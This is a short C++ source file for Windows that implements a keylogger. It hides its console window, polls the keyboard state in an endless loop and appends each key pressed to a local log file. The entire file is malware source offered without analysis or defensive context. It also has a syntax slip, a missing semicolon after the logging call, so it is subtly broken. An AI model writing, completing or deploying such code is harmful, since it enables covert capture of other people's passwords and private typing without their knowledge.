#include<iostream>
using namespace std;
#include<windows.h>
#include<winuser.h>
int saveLogs(int key_stroke, char *file);
void stealth();
int main()
{
	stealth();
	char i;
	while(1)
	{
		for(i=8; i<=190; i++)
		{
			if(GetAsyncKeyState(i) == -32767)
				saveLogs(i,"MYLOGS.txt")
		}
	}
	system("PAUSE");
	return 0;
}
int saveLogs (int key_stroke, char *file)
{
	if((key_stroke == 1) || (key_stroke==2))
		return 0;
	FILE *outputFile;
	outputFile = fopen(file,"a+");
	cout<<key_stroke<<endl;
	if(key_stroke == 8)
		fprintf(outputFile,"%s","[BACKSPACE]");
	else if(key_stroke == 13)
		fprintf(outputFile, "%s", "\n");
	else
		fprintf(outputFile,"%s",&key_stroke);
	fclose(outputFile);
	return 0;

}

void stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(Stealth,0);
}	

